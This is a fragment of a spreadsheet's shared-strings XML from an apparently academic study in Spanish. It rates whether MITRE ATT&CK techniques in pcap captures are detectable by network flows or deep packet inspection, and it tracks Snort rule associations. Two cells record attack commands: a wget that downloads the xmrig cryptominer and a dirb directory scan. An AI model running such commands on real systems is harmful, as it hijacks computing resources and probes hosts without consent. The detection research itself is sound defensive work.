    <t>Detectable por anomalías en tráfico o cambios en flujos de red asociados a nuevos dispositivos; no se inspecciona contenido.</t>
  </si>
  <si>
    <t>Algunas botnets conocidas como Ares tienen patrones de red (canales IRC, beaconing) y existen reglas específicas. Detectable con reglas específicas si se conoce el malware o canal C2.</t>
  </si>
  <si>
    <t>Botnets pueden detectarse por patrones de flujo (beaconing, canales IRC) o por firmas en paquetes (payloads conocidos).</t>
  </si>
  <si>
    <t>Enlaces maliciosos son redirecciones cuya detección depende del comportamiento de conexión más que del contenido específico.</t>
  </si>
  <si>
    <t>Port Knocking genera patrones específicos en flujos (puertos secuenciales); el contenido del paquete es irrelevante.</t>
  </si>
  <si>
    <t>Requiere identificar funciones específicas del protocolo RPC (como DRSUAPI_REPLICA_ADD), lo cual necesita inspección de paquetes.</t>
  </si>
  <si>
    <t>La explotación de EternalBlue se detecta mediante patrones específicos en paquetes SMB (cabeceras y payloads malformados).</t>
  </si>
  <si>
    <t>Requiere inspección de comandos FTP maliciosos (como PUT, MKD, etc.), no identificables en flujos.</t>
  </si>
  <si>
    <t>Si es ataque web genérico sin detalles, es muy difícil afirmarlo. No se especifica patrón concreto, y depende de implementación.</t>
  </si>
  <si>
    <t>El ataque no está especificado en detalle, pero si es un ataque web genérico, requiere inspección del contenido para detectar vulnerabilidad.</t>
  </si>
  <si>
    <t>Inyección SQL con fines de extracción de información requiere inspección del cuerpo de la petición.</t>
  </si>
  <si>
    <t>Requiere inspección del tráfico para detectar ejecución de scriptlets COM que no son visibles en análisis de flujo.</t>
  </si>
  <si>
    <t>Monitorizar tráfico de red correspondiente a softwares de acesso remoto (AnyDesk, TeamViewer...). En su defecto, Deteccion por listas negras/anomalías. Hay firmas que detectan tráfico TeamViewer por puertos específicos o handshake inicial.
Detectable si se tienen firmas específicas de protocolo TeamViewer.</t>
  </si>
  <si>
    <t>TeamViewer puede ser identificado por patrones de flujo (puertos, frecuencia) o por firmas de protocolo específicas (handshake, payloads).</t>
  </si>
  <si>
    <t>Detectable solo si se inspecciona el contenido de plantillas o macros embebidas en el tráfico HTTP o SMTP.</t>
  </si>
  <si>
    <t>La consulta al dominio (LDAP) requiere inspección del contenido para distinguir operaciones de descubrimiento del tráfico legítimo.</t>
  </si>
  <si>
    <t>Detectable por comportamiento anómalo (modificación gráfica interna), no requiere DPI salvo que se observe contenido PowerShell explícito.</t>
  </si>
  <si>
    <t xml:space="preserve"> Detectable por análisis de comportamiento: tráfico continuo e inusual a servidores de minería; no se requiere inspección de contenido.</t>
  </si>
  <si>
    <t>Se detecta por la inspección de tráfico DNS con respuestas masivas no solicitadas; requiere DPI para validar cabeceras y tipo de consulta.</t>
  </si>
  <si>
    <t>El ataque utiliza respuestas Chargen maliciosas, solo visibles inspeccionando paquetes UDP.</t>
  </si>
  <si>
    <t>Inundación ICMP con direcciones IP spoofed debe identificarse mediante DPI para validar contenido y encabezados ICMP.</t>
  </si>
  <si>
    <t>Es necesario analizar tanto patrones de envío de tramas STP (flujo) como el contenido de los paquetes Ethernet para validarlo.</t>
  </si>
  <si>
    <t>El envío masivo de solicitudes HTTP puede detectarse por flujos (cantidad, tasa) o por DPI (headers repetitivos, User-Agent).</t>
  </si>
  <si>
    <t>Este ataque satura la tabla MAC de switches y se detecta por análisis de flujo (muchas direcciones MAC por puerto); no requiere DPI.</t>
  </si>
  <si>
    <t>Puede detectarse tanto por volumen de conexiones en flujos como por estructura de las solicitudes (DPI).</t>
  </si>
  <si>
    <t>Ataque de volumen que puede identificarse por flujos (frecuencia, destino) o por inspección de carga UDP si es estructurada.</t>
  </si>
  <si>
    <t>Requiere inspección de mensajes DHCP para identificar solicitudes anómalas (DISCOVER, REQUEST masivos).</t>
  </si>
  <si>
    <t>Detectable únicamente si se inspecciona que IP origen y destino son iguales en los paquetes TCP SYN (característico del LAND attack).</t>
  </si>
  <si>
    <t>Requiere inspección de paquetes ARP para correlacionar discrepancias entre IP y dirección MAC asociadas.</t>
  </si>
  <si>
    <t>Solo detectable inspeccionando el envío de respuestas SYN-ACK no solicitadas. El análisis de flujo no da contexto suficiente.</t>
  </si>
  <si>
    <t>Detectable por anomalías en secuencia de reseteos de conexión frecuentes desde direcciones sospechosas.</t>
  </si>
  <si>
    <t>Se requiere DPI para verificar que los paquetes TCP SYN provienen de direcciones IP falsificadas (spoofed).</t>
  </si>
  <si>
    <t>Requiere inspección del contenido HTTP (peticiones incompletas y parciales mantenidas abiertas).</t>
  </si>
  <si>
    <t>Detectable mediante DPI observando cabeceras HTTP enviadas muy lentamente y sin completar la solicitud.</t>
  </si>
  <si>
    <t>Ataque que envía peticiones HTTP parciales; solo DPI permite detectar este comportamiento característico.</t>
  </si>
  <si>
    <t>Puede detectarse tanto por patrones de flujo como por contenido repetitivo en paquetes.</t>
  </si>
  <si>
    <t>La inspección de paquetes permite detectar patrones SQL maliciosos.</t>
  </si>
  <si>
    <t>Las cadenas características de una web shell se detectan en el contenido del paquete.</t>
  </si>
  <si>
    <t>Detección por anomalías, análisis de la estructura de correos electrónicos, petición de información confidencial, etc. Generalmente requiere inspección semántica del contenido; reglas genéricas no son suficientes.</t>
  </si>
  <si>
    <t>El spearphishing interno, cuando implica el envío de correos electrónicos dentro de una red, puede detectarse mediante DPI si inspeccionamos el cuerpo del mensaje (por ejemplo, contenido HTML, links o adjuntos maliciosos).
Pero también puede ser detectable solo con flujos, si observamos un comportamiento anómalo como:
Un host interno que comienza a enviar grandes volúmenes de correos (nunca lo había hecho antes).
Comunicaciones inusuales entre segmentos que antes no interactuaban.
Herramientas SIEM o NDR pueden detectar anomalías de flujo sin necesidad de inspeccionar el contenido del correo.</t>
  </si>
  <si>
    <t>Deteccion por listas negras/anomalías. Exfiltración por canales normales requiere correlación/análisis comportamental.</t>
  </si>
  <si>
    <t>Es necesario el contenido para identificar fuga, y flujos para detectar anomalías.</t>
  </si>
  <si>
    <t>Regla personalizada que comprueba si la IP del servidor TFTP es la del servidor legítimo; o que el SO enviado por el atacante contenga algun tipo de malware detectable por un IDS</t>
  </si>
  <si>
    <t>El ataque se detecta por patrones anómalos en el flujo de comunicación.</t>
  </si>
  <si>
    <t>Detección por anomalías. No existen firmas públicas conocidas que lo cubran sin adaptación o contexto específico.</t>
  </si>
  <si>
    <t>La creación/modificación de servicios puede deducirse por comportamiento de red.</t>
  </si>
  <si>
    <t>Los ataques de ARP/DHCP spoofing dependen de contenido de paquetes manipulados.</t>
  </si>
  <si>
    <t>Si el ataque viene seguido de suplantaciones ARP, con el uso de preprocesadores de Snort resulta posible su detección. En caso de que el ataque se centre únicamente en el establecimiento del atacante como puente raíz, no existe mecanismo de detección. No existen firmas públicas conocidas que lo cubran sin adaptación o contexto específico.</t>
  </si>
  <si>
    <t>No existen firmas públicas conocidas que lo cubran sin adaptación o contexto específico.</t>
  </si>
  <si>
    <t>Requiere correlación de patrón de flujo y protocolos utilizados dentro de SSH.</t>
  </si>
  <si>
    <t>Puede detectarse por:
DPI: Analizando el contenido del tráfico DNS (por ejemplo, respuestas inesperadas a dominios populares desde fuentes no autorizadas).
Flujos: Detección basada en comportamiento como:
Frecuentes consultas/respuestas DNS no correlacionadas con flujos anteriores.
Cambios repetidos de IP para dominios específicos (indicativo de ataques tipo Fast Flux o envenenamiento).</t>
  </si>
  <si>
    <t>Similar al anterior, pero enfocado en redirigir tráfico legítimo a destinos controlados por el atacante.
DPI: Puede ver el contenido del paquete DNS y detectar redirecciones hacia IPs no legítimas (blacklists, firmas de dominios, etc.).
Flujos: Un patrón anómalo donde hosts comienzan a contactar IPs fuera del rango esperado tras resolución DNS también puede ser un indicador.
Además, el uso de servidores DNS no autorizados (por flujo de conexiones hacia ellos) puede ser detectable por sistemas basados en flujo.</t>
  </si>
  <si>
    <t>El ataque se caracteriza por comportamiento repetitivo que es visible a nivel de conexión, no a nivel de contenido.</t>
  </si>
  <si>
    <t>El comportamiento repetitivo en múltiples destinos es visible en los flujos. Herramientas como theHarvester y similares no se enfocan en enviar correos, sino en hacer consultas (por ejemplo, a motores de búsqueda, redes sociales o servidores SMTP) para recolectar direcciones.
No suele haber contenido malicioso en los paquetes, por lo tanto, el DPI no aporta mucho valor.
En cambio, los flujos de red muestran patrones de comportamiento repetitivo:
Muchas conexiones a servicios web o DNS en poco tiempo.
Comportamientos automatizados que simulan actividad de bots.
Por eso se detecta mejor por sistemas como NetFlow, sFlow o Zeek con correlación de actividad</t>
  </si>
  <si>
    <t>El comportamiento repetitivo en múltiples destinos es visible en los flujos.</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="10"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">Instalacion y uso de software de minado. Comando: wget </t>
    </r>
    <r>
      <rPr>
        <u/>
        <sz val="10"/>
        <color rgb="FF1155CC"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-x64.tar.gz</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="10"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">Ejecucion de comando dirb para escaneo de la estructura de directorios (dirb </t>
    </r>
    <r>
      <rPr>
        <u/>
        <sz val="10"/>
        <color rgb="FF1155CC"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>http://IP</t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> -w /usr/share/dirb/wordlist/vulns/apache.txt)</t>
    </r>
  </si>
  <si>
    <t>Solo mediante DPI puede observarse la manipulación de los campos del protocolo TLS; los flujos no ofrecen esta visibilidad.</t>
  </si>
  <si>
    <t>Los flujos indican actividad Bluetooth, pero para confirmar exfiltración se necesita ver el contenido transmitido (requiere ambos).</t>
  </si>
  <si>
    <t>La naturaleza de los escaneos de puertos es detectable por el patrón de conexiones, visible en flujos.</t>
  </si>
  <si>
    <t>La interacción con servicios remotos se detecta por flujos anómalos hacia servicios de sesión (ej. LSM API).</t>
  </si>
  <si>
    <t>ChopChop implica manipulación de paquetes fragmentados, visible solo con DPI.</t>
  </si>
  <si>
    <t>La detección requiere analizar el contenido de los archivos transmitidos, ya que los flujos no revelan esteganografía.</t>
  </si>
  <si>
    <t>Las llamadas específicas a funciones del protocolo DCERPC son visibles Ãºnicamente con inspección profunda de los paquetes.</t>
  </si>
  <si>
    <t>Copia repentina desde recursos compartidos puede reflejarse en volÃºmenes de flujo atípicos.</t>
  </si>
  <si>
    <t>La duplicación de tráfico produce patrones redundantes fáciles de identificar por flujo, sin inspección de contenido.</t>
  </si>
  <si>
    <t>Las conexiones SSH son cifradas; aunque los flujos muestran el tráfico, no se puede inspeccionar su contenido con DPI.</t>
  </si>
  <si>
    <t>Se requiere análisis del patrón de transferencia (flujo) y contenido transmitido para confirmar exfiltración (ambos).</t>
  </si>
  <si>
    <t>Nikto realiza mÃºltiples solicitudes HTTP rápidas que pueden identificarse fácilmente en los flujos.</t>
  </si>
  <si>
    <t>La creación de un canal secundario puede verse en los flujos, pero detectar el cambio activo entre canales requiere DPI también.</t>
  </si>
  <si>
    <t>Fragmentación como técnica de evasión requiere análisis del contenido fragmentado, solo posible con DPI.</t>
  </si>
  <si>
    <t>Tanto los flujos (por patrón de tamaño y frecuencia) como el DPI (por contenido) pueden detectar esta técnica (cualquiera sirve).</t>
  </si>
  <si>
    <t>JUSTIFICACIÓN NIVEL DE ATAQUE
(Contexto de Ataque)</t>
  </si>
  <si>
    <t>Documentación</t>
  </si>
  <si>
    <t>Validaciones</t>
  </si>
  <si>
    <t>Análisis Manual</t>
  </si>
  <si>
    <t>El envío masivo de tramas falsas requiere flujos para ver el volumen y DPI para confirmar encabezados aleatorios. No requiere ambos modos simultáneamente.</t>
  </si>
  <si>
    <t>DPI ayuda a identificar contenido JS malicioso; flujos detectan dominios anómalos.</t>
  </si>
  <si>
    <t>DETECTABLE POR FLUJOS O POR PAQUETES (DPI): Motivo</t>
  </si>
  <si>
    <t>DETECTABLE POR FLUJOS O POR PAQUETES (DPI): Flujos/DPI/Ambos/Cualquiera</t>
  </si>
  <si>
    <t>Requiere DPI para inspeccionar correos + flujos para detectar anomalías.</t>
  </si>
  <si>
    <t>para cada RS de Snort, contendrá los SIDs que han sido considerados de forma manual como No Relacionados (pero son ataques)</t>
  </si>
  <si>
    <t>ESTUDIO</t>
  </si>
  <si>
    <t>IDSs Comerciales</t>
  </si>
  <si>
    <t>Requisito de pcaps</t>
  </si>
  <si>
    <t>Requisitos de pcaps para estudios</t>
  </si>
  <si>
    <t>Técnica Detectable por Red</t>
  </si>
  <si>
    <t>Nº pcaps Tabla detecciones no lo cumplen</t>
  </si>
  <si>
    <t>Nº pcaps en Tabla de Detecciones</t>
  </si>
  <si>
    <t>DETECTABILIDAD  por IDS L3 (Red)</t>
  </si>
  <si>
    <t>Marcado Manual (CSV "-Manual") disponible</t>
  </si>
  <si>
    <t>RELLENAR COLUMNA</t>
  </si>
  <si>
    <t>FALTAN 6 PCAPS</t>
  </si>
  <si>
    <t>Asociación Manual (a TP/FP) de SIDs Snort (en cada RSx)</t>
  </si>
  <si>
    <t>Asociación Manual TP/FP de SIDs</t>
  </si>
  <si>
    <t>Contaje Manual realizado (de Flujos, mensajes, Instancias)</t>
  </si>
  <si>
    <t>Contaje Manual realizado (de Flujos, mensajes, Instancias)
Marcado Manual (CSV "-Manual") disponible</t>
  </si>
  <si>
    <t>TODOS CARACTERIZADOS? (pendiente aclarar "ANÁLISIS MANUAL REALIZADO"), FALTA MARCADO (CSVs)!!</t>
  </si>
  <si>
    <t>Cubran todas las Técnicas de Red</t>
  </si>
  <si>
    <t>Ataques detectables a nivel L3 (no L2)</t>
  </si>
  <si>
    <t>Asociación Manual (a TP/FP) de attackid/threatid</t>
  </si>
  <si>
    <t>Hoja "Técnicas Cubiertas Estudio Snort"</t>
  </si>
  <si>
    <t>Asociación Manual TP/FP de attackid's</t>
  </si>
  <si>
    <t>USADO PARA CÁLCULO DE CAPACIDAD DE DETECCIÓN COMERCIALES</t>
  </si>
  <si>
    <t>USADO PARA CÁLCULO DE CAPACIDAD DE DETECCIÓN SNORT</t>
  </si>
  <si>
    <t>¿-?</t>
  </si>
  <si>
    <t>NOTA: Son los ataques que usaron los TFGs para los resultados</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <i/>
        <sz val="10"/>
        <color rgb="FFFF0000"/>
        <rFont val="Arial"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Columnas</t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> para Filtrar</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Ver Hoja "Técnicas Cubiertas Estudio Snort"
</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="7"/>
        <rFont val="Arial"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Ver Hoja "Técnicas Cubiertas Estudio Comer"</t>
    </r>
  </si>
  <si>
    <t>Marcado Manual de Ataques (Flujos, Instancias, Mensajes en CSV)</t>
  </si>
  <si>
    <t>Ataque detectable por Patrones/Reglas</t>
  </si>
  <si>
    <t>SIDs TP (Manual)</t>
  </si>
  <si>
    <t>Columnas Resultantes (Rellenar)</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Arial"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Asociación Manual TP/FP de SIDs (para cada RSx)
Asociación Manual verificada comprobando flujos</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
#SIDs &gt; 0
SIDs FP (Manual) != -
#SIDs TP (Manual) != 0 o -</t>
    </r>
  </si>
  <si>
    <t>Nº DE FLUJOS CON ATAQUE/S PRINCIPAL/ES</t>
  </si>
  <si>
    <t>para cada RS de Snort, número de flujos con ataques PRINCIPALES manualmente calificados como TP detectados por el RuleSet</t>
  </si>
  <si>
    <t>Nº SIN REPETICIONES</t>
  </si>
  <si>
    <t>Mediante el uso de preprocesadores, la detección de este ataque es posible estableciendo un asociación entre la IP a proteger y su dirección MAC correspondiente. De esta forma, se puede fundar una regla que detecte mensajes ARP que incumplen esta asociación y que avisen de un posible ataque por suplantación MAC</t>
  </si>
  <si>
    <t>NO (MITRE)</t>
  </si>
  <si>
    <t>NO (OSI L2)</t>
  </si>
  <si>
    <t>NIVEL DE RED DE LA VICTIMA DEL ATAQUE (MODELO OSI)</t>
  </si>
  <si>
    <t>Indica el nivel de red del equipo víctima del ataque: L3 si el ataque se apoya, como mínimo, en la capa 3 del modelo OSI o L2 si lo hace por debajo, es decir, a nivel de Switch, WiFi o algún protocolo de enlace</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">* </t>
    </r>
    <r>
      <rPr>
        <b/>
        <i/>
        <u/>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Técnicas NO detectables por red según MITRE</t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>: Aunque se ha comprobado que es posible detectar estos ataques por red, MITRE no los marca como tales (sin "Network Traffic" en "Data Source" o "Detection") porque MITRE sólo indica las fuentes de detección más fiables.
Ejemplo: T1110.001 puede ser detectable por red (y un IDS puede detectar muchos bruteforce en red), pero:
- Cifrado (SSH/TLS/DoH) oculta credenciales y payload; la detección depende de metadatos (tasa, tamaño, flags), no del contenido.
- Ataques distribuidos (low-and-slow desde muchas IPs) pueden parecer tráfico “ruidoso normal” y evadir reglas simples.
- Falsos positivos: servicios legítimos con muchos intentos (automatizaciones, scanners internos) pueden disparar alertas si no están bien filtrados.</t>
    </r>
  </si>
  <si>
    <t>NO (MITRE y L2)</t>
  </si>
  <si>
    <t>Técnica Detectable por Red (según MITRE) v16.1</t>
  </si>
  <si>
    <t>Técnica Detectable por Red (según MITRE) v17</t>
  </si>
  <si>
    <t>Nº</t>
  </si>
  <si>
    <t>v16.1 (30-01-2025)</t>
  </si>
  <si>
    <t>v17 (22-06-2025)</t>
  </si>
  <si>
    <t>T1667</t>
  </si>
  <si>
    <t>T1669</t>
  </si>
  <si>
    <t>??</t>
  </si>
  <si>
    <t>Nº Técnica detectable en Red</t>
  </si>
  <si>
    <t>FICHERO PCAP - OLD</t>
  </si>
  <si>
    <t>Subtécnica Detectable por Red (según MITRE) v16.1</t>
  </si>
  <si>
    <t>Subtécnica Detectable por Red (según MITRE) v17</t>
  </si>
  <si>
    <t>NO
SI: T1565.002</t>
  </si>
  <si>
    <t>SI (FALTA T1565.002)</t>
  </si>
  <si>
    <t>USADO PARA CÁLCULO DE CAPACIDAD DE DETECCIÓN COMERCIALES (en TFGs)</t>
  </si>
  <si>
    <t>Técnica MITRE y Características del ataque</t>
  </si>
  <si>
    <t>Detectabilidad y Uso del ataque</t>
  </si>
  <si>
    <t>Otras Características del ataque</t>
  </si>
  <si>
    <t>SI (FALTA con Proto Snort)</t>
  </si>
  <si>
    <t>v17</t>
  </si>
  <si>
    <t>NO (ARP Preprocesadores)</t>
  </si>
  <si>
    <t>v17 (FALTA)</t>
  </si>
  <si>
    <t>Nº SubTécnica detectable en Red</t>
  </si>
  <si>
    <t>v16.1</t>
  </si>
  <si>
    <t>SIN Implementar</t>
  </si>
  <si>
    <t>Implementadas</t>
  </si>
  <si>
    <t>T1001.001</t>
  </si>
  <si>
    <t>S</t>
  </si>
  <si>
    <t>T1011.001</t>
  </si>
  <si>
    <t>T1021.001</t>
  </si>
  <si>
    <t>T1021.002</t>
  </si>
  <si>
    <t>T1021.003</t>
  </si>
  <si>
    <t>T1021.005</t>
  </si>
  <si>
    <t>T1021.006</t>
  </si>
  <si>
    <t>T1048.001</t>
  </si>
  <si>
    <t>T1048.002</t>
  </si>
  <si>
    <t>T1053.005</t>
  </si>
  <si>
    <t>T1071.001</t>
  </si>
  <si>
    <t>T1071.002</t>
  </si>
  <si>
    <t>T1071.003</t>
  </si>
  <si>
    <t>T1071.005</t>
  </si>
  <si>
    <t>S17</t>
  </si>
  <si>
    <t>T1090.002</t>
  </si>
  <si>
    <t>T1090.003</t>
  </si>
  <si>
    <t>T1090.004</t>
  </si>
  <si>
    <t>T1102.001</t>
  </si>
  <si>
    <t>T1102.002</t>
  </si>
  <si>
    <t>T1132.002</t>
  </si>
  <si>
    <t>T1176.001</t>
  </si>
  <si>
    <t>T1176.002</t>
  </si>
  <si>
    <t>T1204.004</t>
  </si>
  <si>
    <t>T1205.002</t>
  </si>
  <si>
    <t>T1218.003</t>
  </si>
  <si>
    <t>T1218.005</t>
  </si>
  <si>
    <t>T1218.007</t>
  </si>
  <si>
    <t>T1219.001</t>
  </si>
  <si>
    <t>T1219.002</t>
  </si>
  <si>
    <t>T1491.002</t>
  </si>
  <si>
    <t>T1496.001</t>
  </si>
  <si>
    <t>T1496.002</t>
  </si>
  <si>
    <t>T1557.001</t>
  </si>
  <si>
    <t>T1557.004</t>
  </si>
  <si>
    <t>T1563.001</t>
  </si>
  <si>
    <t>T1565.002</t>
  </si>
  <si>
    <t>T1566.003</t>
  </si>
  <si>
    <t>T1567.001</t>
  </si>
  <si>
    <t>T1567.003</t>
  </si>
  <si>
    <t>T1567.004</t>
  </si>
  <si>
    <t>T1568.002</t>
  </si>
  <si>
    <t>T1568.003</t>
  </si>
  <si>
    <t>T1573.001</t>
  </si>
  <si>
    <t>T1595.001</t>
  </si>
  <si>
    <t>T1598.001</t>
  </si>
  <si>
    <t>T1598.002</t>
  </si>
  <si>
    <t>T1602.002</t>
  </si>
  <si>
    <t>V16.1:</t>
  </si>
  <si>
    <t>Nº Técnicas</t>
  </si>
  <si>
    <t>Sólo V17</t>
  </si>
  <si>
    <t>SUMA</t>
  </si>
  <si>
    <t>T1001.002-Data_obfuscation_steganography</t>
  </si>
  <si>
    <t>T1001.003-Data_obfuscation_protocol_impersonation</t>
  </si>
  <si>
    <t>T1003.006-Os_credential_dumping_dcsync</t>
  </si>
  <si>
    <t>T1008-Fallback_channels</t>
  </si>
  <si>
    <t>T1011.001-Exfiltration_over_bluetooth</t>
  </si>
  <si>
    <t>T1018-Service_discovery</t>
  </si>
  <si>
    <t>T1020.001-Automated_exfiltration_traffic_duplication</t>
  </si>
  <si>
    <t>T1021.004-remote_services_ssh</t>
  </si>
  <si>
    <t>T1029-Scheduled_transfer</t>
  </si>
  <si>
    <t>T1030-Transfer_Size_Limits</t>
  </si>
  <si>
    <t>T1033-System_owner</t>
  </si>
  <si>
    <t>T1039-Data_from_network_shared_drive</t>
  </si>
  <si>
    <t>T1041-exfiltration_over_c2_channel</t>
  </si>
  <si>
    <t>T1046-Network_scan</t>
  </si>
  <si>
    <t>T1046-Version_services_detection1</t>
  </si>
  <si>
    <t>T1046-Version_services_detection2</t>
  </si>
  <si>
    <t>T1047-WinRM</t>
  </si>
  <si>
    <t>T1048.003-Exfiltration_over_FTP</t>
  </si>
  <si>
    <t xml:space="preserve">T1048.003-Exfiltration_over_ICMP </t>
  </si>
  <si>
    <t>T1053.002-Scheduled_TaskJob_At</t>
  </si>
  <si>
    <t>T1070.005-Indicator_removal_network_share_connection_removal</t>
  </si>
  <si>
    <t>T1071.004-Tunel</t>
  </si>
  <si>
    <t>T1087.002-AccountDiscovery_DomainAccount</t>
  </si>
  <si>
    <t>T1090.001-Proxy_internal_proxy</t>
  </si>
  <si>
    <t>T1095-Non_Application_Layer</t>
  </si>
  <si>
    <t>T1102.003-Web_service-one_way_communication</t>
  </si>
  <si>
    <t>T1104-Multi_stage_channels</t>
  </si>
  <si>
    <t>T1105-Ingress_Tool_Transfer</t>
  </si>
  <si>
    <t>T1112-Modify_registry</t>
  </si>
  <si>
    <t>T1114.002-Email_collection_remote_email_collection</t>
  </si>
  <si>
    <t>T1132.001-Standard_Encoding</t>
  </si>
  <si>
    <t>T1133-External_remote_services</t>
  </si>
  <si>
    <t>T1176-Browser-extension</t>
  </si>
  <si>
    <t>T1187-Forced_Authentication</t>
  </si>
  <si>
    <t>T1187-Forced_Authentication2</t>
  </si>
  <si>
    <t>T1189-Drive-by_compromise_v1</t>
  </si>
  <si>
    <t>T1189-Drive-by_compromise_v2</t>
  </si>
  <si>
    <t>T1190-Sql_injection1</t>
  </si>
  <si>
    <t>T1190-Sql_inyection2</t>
  </si>
  <si>
    <t>T1190-SQL_Injection_High_Bytes1</t>
  </si>
  <si>
    <t>T1190-SQL_Injection_High_Bytes2</t>
  </si>
  <si>
    <t>T1197-BITS_Jobs</t>
  </si>
  <si>
    <t>T1199-Trusted_relationship</t>
  </si>
  <si>
    <t>T1200-Hardware_Additions</t>
  </si>
  <si>
    <t>T1204.001-malicious_link</t>
  </si>
  <si>
    <t>T1205.001-Port_Knocking</t>
  </si>
  <si>
    <t>T1207-Rogue_domain_controller</t>
  </si>
  <si>
    <t>T1210-Eternal_blue</t>
  </si>
  <si>
    <t>T1210-Remote_code_execution</t>
  </si>
  <si>
    <t>T1210-Web_attack</t>
  </si>
  <si>
    <t>T1218.010-COM_Scriptlet</t>
  </si>
  <si>
    <t>T1219-RemoteAccessSoftwareLocal</t>
  </si>
  <si>
    <t>T1219-RemoteAccessSoftwareNAT</t>
  </si>
  <si>
    <t>T1221-Template_Injection</t>
  </si>
  <si>
    <t>T1482-Domain_trust_discovery</t>
  </si>
  <si>
    <t>T1491.001-Internal_Defacement</t>
  </si>
  <si>
    <t>T1496-Cryptomining</t>
  </si>
  <si>
    <t>T1498.002-Amplif_dns</t>
  </si>
  <si>
    <t>T1498.002-Fraggle</t>
  </si>
  <si>
    <t>T1498.002-Smurf</t>
  </si>
  <si>
    <t>T1498.001-HTTP_flood</t>
  </si>
  <si>
    <t>T1498.001-MAC_table_flood</t>
  </si>
  <si>
    <t>T1498.001-TCP_flood</t>
  </si>
  <si>
    <t>T1498.001-UDP_flood</t>
  </si>
  <si>
    <t>T1498.001-UDP_flood_1</t>
  </si>
  <si>
    <t>T1498.001-UDP_flood_2</t>
  </si>
  <si>
    <t>T1499.002-Dhcp_flood</t>
  </si>
  <si>
    <t>T1499.001-Land</t>
  </si>
  <si>
    <t>T1499.002-Reflexion_synack</t>
  </si>
  <si>
    <t>T1499.002-Reseteo</t>
  </si>
  <si>
    <t>T1499.001-Syn_suplantacion</t>
  </si>
  <si>
    <t>T1499.001-OS_Exhaustion_Flood</t>
  </si>
  <si>
    <t>T1499.002-Slowhttptest</t>
  </si>
  <si>
    <t>T1499.002-Slowloris</t>
  </si>
  <si>
    <t>T1499.003-GoldenEye</t>
  </si>
  <si>
    <t>T1499.003-Hulk</t>
  </si>
  <si>
    <t>T1505.001-SQL_inyection</t>
  </si>
  <si>
    <t>T1505.005-Shell_Web</t>
  </si>
  <si>
    <t>T1534-Internal_spearphishing</t>
  </si>
  <si>
    <t>T1537-Transfer_Data_to_Cloud_Account</t>
  </si>
  <si>
    <t>T1542.005-TFTP_Boot</t>
  </si>
  <si>
    <t>T1543.003-CreateSystemProcessWindowsService</t>
  </si>
  <si>
    <t>T1557.003-Dhcp_spoofing</t>
  </si>
  <si>
    <t>T1563.002-RDPHijacking</t>
  </si>
  <si>
    <t>T1565.001-SQL_inyection</t>
  </si>
  <si>
    <t>T1566.001-Malicious_mail</t>
  </si>
  <si>
    <t>T1566.002-Spearphishing_Link</t>
  </si>
  <si>
    <t>T1567.002-Exfiltration_To_Cloud_Storage</t>
  </si>
  <si>
    <t>T1568.001-FastFluxDNS</t>
  </si>
  <si>
    <t>T1569.002-System_services_service_execution</t>
  </si>
  <si>
    <t>T1570-Lateral_Tool_Transfer</t>
  </si>
  <si>
    <t>T1571-SSH</t>
  </si>
  <si>
    <t>T1572-Protocol_Tunneling</t>
  </si>
  <si>
    <t>T1573.002-AsymetricCryptography</t>
  </si>
  <si>
    <t>T1585.001-Establish_social_accounts</t>
  </si>
  <si>
    <t>T1586.001-Compromise_Accounts</t>
  </si>
  <si>
    <t>T1589.002-Gather_victim_identity_information</t>
  </si>
  <si>
    <t>T1595.002-Port_Scanning</t>
  </si>
  <si>
    <t>T1595.003-Web_page_scanning1</t>
  </si>
  <si>
    <t>T1595.003-Web_page_scanning2</t>
  </si>
  <si>
    <t>T1598.003-Spearphishing_Link</t>
  </si>
  <si>
    <t>T1599.001-NBB1</t>
  </si>
  <si>
    <t>T1599.001-NBB2</t>
  </si>
  <si>
    <t>T1599-Salto_vlan</t>
  </si>
  <si>
    <t>T1602.001-MIB_Dump</t>
  </si>
  <si>
    <t>T1612-BuildImageOnHostLocal</t>
  </si>
  <si>
    <t>T1612-BuildImageOnHostNAT</t>
  </si>
  <si>
    <t>T1615-Group_Policy_Discovery</t>
  </si>
  <si>
    <t>T1659-Content_Injection</t>
  </si>
  <si>
    <t>T1665-Hide_Infrastructure</t>
  </si>
  <si>
    <t>Requisitos (Snort es un IDS L3, inspecciona mensajes IP y ARP -preprocesador arp_spoof-):
- Network Traffic en MITRE v16.1 (no v17)
- Detectabilidad L3 (Protocolo Visible Snort)
- ARP excluído (preprocesador si/no activado en v2 y v3)</t>
  </si>
  <si>
    <t>#FLUJOS</t>
  </si>
  <si>
    <t>#FLUJOS CON ATAQUE/S PRINCIPAL/ES</t>
  </si>
  <si>
